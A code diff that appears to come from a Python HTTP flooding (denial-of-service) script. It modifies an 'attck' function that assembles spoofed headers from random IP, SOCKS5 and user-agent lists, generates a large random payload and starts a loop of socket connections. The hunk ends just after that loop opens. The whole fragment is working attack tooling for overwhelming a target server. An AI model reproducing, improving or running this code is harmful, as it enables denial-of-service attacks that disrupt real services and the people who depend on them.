@@ -878,14 +878,15 @@ def start():
             s.close()
             print('[+] server error')
 def attck():
-  global userip,socks5,ref
+  global userip,socks5,useragent2,useragents
   data3 = random._urandom(85000)
   xx = int(0)
   anjgall = "Anjing: "+random.choice(userip)+random.choice(socks5)+"\r\n"
+  userkau = "UserAgents2: "+random.choice(useragent2)+random.choice(useragents)+random.choice(userip)+"\r\n"
   content = "Content-Type: application/x-www-form-urlencoded"+"\r\n"
   length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-  lolanjg = "refall"+random.choice(ref)+random.choice(userip)+random.choice(socks5)+"\r\n"
-  main_req = anjgall + lolanjg + content + length + "\r\n"
+  lolanjg = "refall"+random.choice(useragents)+random.choice(userip)+random.choice(socks5)+"\r\n"
+  main_req = anjgall + lolanjg + userkau + content + length + "\r\n"
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
